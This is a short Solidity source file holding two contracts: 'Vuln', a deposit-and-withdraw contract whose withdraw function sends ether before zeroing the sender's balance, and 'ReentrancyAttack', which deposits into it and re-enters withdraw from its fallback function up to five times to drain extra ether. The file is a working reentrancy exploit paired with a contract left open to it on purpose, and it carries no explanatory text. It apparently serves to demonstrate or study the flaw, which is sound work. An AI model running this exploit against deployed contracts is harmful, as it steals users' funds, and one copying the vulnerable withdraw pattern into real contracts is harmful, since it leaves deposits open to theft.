pragma solidity 0.5.1;

contract Vuln {
    mapping(address => uint256) public balances;

    event LogDeposit(address sender, uint amount);
    event LogWithdrawal(address sender, uint amount);

    function deposit() public payable {
        
        emit LogDeposit(msg.sender, msg.value);
        balances[msg.sender] += msg.value;
    }

    function withdraw() public returns(bytes memory) {
        
        emit LogWithdrawal(msg.sender, balances[msg.sender]);
        (bool result, bytes memory x)  = msg.sender.call.value(balances[msg.sender])("");
        if(result) {
            
            balances[msg.sender] = 0;
        }
        return x;
    }

}

contract ReentrancyAttack {
    Vuln target;
    uint iterations = 0;

    constructor(address t) public {
        target = Vuln(t);
    }

    function depositamount() public payable{
        target.deposit.value(msg.value)();
    }
    function withdrawamount() public payable{
        target.withdraw();
        msg.sender.transfer(address(this).balance);
    }

     function () external payable{
        if (iterations < 5){
            iterations++;
            target.withdraw();
        }
        iterations = 0;
     }
}
